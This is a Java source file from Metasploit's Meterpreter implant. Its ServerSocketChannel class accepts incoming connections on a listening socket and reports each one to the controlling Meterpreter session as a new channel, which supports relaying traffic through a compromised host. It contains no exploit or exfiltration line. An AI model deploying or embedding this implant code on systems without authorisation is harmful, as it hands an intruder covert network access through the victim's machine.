package com.metasploit.meterpreter;

import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.SocketException;

/**
 * A channel for a {@link ServerSocket}.
 * 
 * @author mihi
 */
public class ServerSocketChannel extends Channel {

	private final ServerSocket serverSocket;
	private boolean closed = false;

	/**
	 * Create a new socket channel.
	 * 
	 * @param meterpreter
	 *            The meterpreter this channel should be assigned to.
	 * @param socket
	 *            Socket of the channel
	 */
	public ServerSocketChannel(Meterpreter meterpreter, ServerSocket serverSocket) throws IOException {
		super(meterpreter, new ByteArrayInputStream(new byte[0]), null);
		this.serverSocket = serverSocket;
		new AcceptThread().start();
	}

	public void close() throws IOException {
		closed = true;
		serverSocket.close();
		super.close();
	}
	
	Meterpreter getMeterpreter() {
		return meterpreter;
	}
	
	private class AcceptThread extends Thread {
		public void run() {
			try {
				while(true) {
					Socket s = serverSocket.accept();
					SocketChannel ch = new SocketChannel(getMeterpreter(), s);
					
					TLVPacket packet = new TLVPacket();
					packet.add(TLVType.TLV_TYPE_CHANNEL_ID, ch.getID());
					packet.add(TLVType.TLV_TYPE_CHANNEL_PARENTID, getID());
					packet.add(TLVType.TLV_TYPE_LOCAL_HOST, s.getLocalAddress().getHostAddress());
					packet.add(TLVType.TLV_TYPE_LOCAL_PORT, s.getLocalPort());
					packet.add(TLVType.TLV_TYPE_PEER_HOST, s.getInetAddress().getHostAddress());
					packet.add(TLVType.TLV_TYPE_PEER_PORT, s.getPort());
					getMeterpreter().writeRequestPacket("tcp_channel_open", packet);
					ch.startInteract();
				}
			} catch (SocketException t) {
				if (closed)
					return;
				t.printStackTrace(getMeterpreter().getErrorStream());
			} catch (Throwable t) {
				t.printStackTrace(getMeterpreter().getErrorStream());
			}
		}
	}
}
